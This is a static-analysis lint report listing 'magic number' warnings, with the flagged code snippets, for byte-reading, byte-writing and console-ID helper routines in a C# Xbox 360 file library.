Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadInt32,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (4);  	return BitConv.ToInt32 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadInt64,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (8);  	return BitConv.ToInt64 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadSingle,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (4);  	return BitConv.ToSingle (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadDouble,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (8);  	return BitConv.ToDouble (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt16,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (2);  	return BitConv.ToUInt16 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt32,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (4);  	return BitConv.ToUInt32 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt64,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (8);  	return BitConv.ToUInt64 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: try {  	List<byte> buffer = new List<byte> ();  	if (xType == StringForm.Unicode) {  		if (Position >= Length - 1)  			return "";  		byte[] buff = ReadBytes (2);  		while (buff [0] != BreakIndicator) {  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  		else  			return Encoding.Unicode.GetString (buffer.ToArray ());  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		while (buff != (byte)BreakIndicator) {  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: try {  	List<byte> buffer = new List<byte> ();  	if (xType == StringForm.Unicode) {  		if (Position >= Length - 1)  			return "";  		byte[] buff = ReadBytes (2);  		while (buff [0] != BreakIndicator) {  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  		else  			return Encoding.Unicode.GetString (buffer.ToArray ());  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		while (buff != (byte)BreakIndicator) {  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: if (xType == StringForm.Unicode) {  	if (Position >= Length - 1)  		return "";  	byte[] buff = ReadBytes (2);  	while (buff [0] != BreakIndicator) {  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  	else  		return Encoding.Unicode.GetString (buffer.ToArray ());  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	while (buff != (byte)BreakIndicator) {  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: if (xType == StringForm.Unicode) {  	if (Position >= Length - 1)  		return "";  	byte[] buff = ReadBytes (2);  	while (buff [0] != BreakIndicator) {  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  	else  		return Encoding.Unicode.GetString (buffer.ToArray ());  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	while (buff != (byte)BreakIndicator) {  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: while (buff [0] != BreakIndicator) {  	try {  		buffer.AddRange (buff);  		buff = ReadBytes (2);  	}  	catch {  		break;  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: try {  	buffer.AddRange (buff);  	buff = ReadBytes (2);  }  catch {  	break;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: buff = ReadBytes (2);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.Unicode) {  	byte[] buff = ReadBytes (2);  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff [0] == 0 && buff [1] == 0)  			break;  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else  		return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff == 0)  			break;  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  		i++;  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.Unicode) {  	byte[] buff = ReadBytes (2);  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff [0] == 0 && buff [1] == 0)  			break;  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else  		return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff == 0)  			break;  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  		i++;  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: while (xStringSize == 0 || i < xStringSize) {  	if (buff [0] == 0 && buff [1] == 0)  		break;  	try {  		buffer.AddRange (buff);  		buff = ReadBytes (2);  	}  	catch {  		break;  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	buffer.AddRange (buff);  	buff = ReadBytes (2);  }  catch {  	break;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: buff = ReadBytes (2);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: for (int i = 0; i < len; i++) {  	if (xStringType == StringForm.ASCII)  		Buffer.AddRange (ReadBytes (2));  	else  		Buffer.Add (ReadByte ());  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.ASCII)  	Buffer.AddRange (ReadBytes (2));  else  	Buffer.Add (ReadByte ());  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: Buffer.AddRange (ReadBytes (2));  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt24,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (3);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt24,The following statement contains a magic number: xList.RemoveAt (3);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (6);  	xList.RemoveAt (6);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (6);  	xList.RemoveAt (6);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: xList.RemoveAt (6);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: xList.RemoveAt (6);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt56,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' BigEndian).ToList<byte> ();  	xList.RemoveAt (7);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt56,The following statement contains a magic number: xList.RemoveAt (7);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: foreach (char x in xid)  	xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: return (long.Parse (xid) << 4 | xcrc);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ConsoleIDToID,The following statement contains a magic number: foreach (char x in xid)  	xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ConsoleIDToID,The following statement contains a magic number: xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: if ((xInput.Length % 2) != 0)  	xInput = "0" + xInput;  
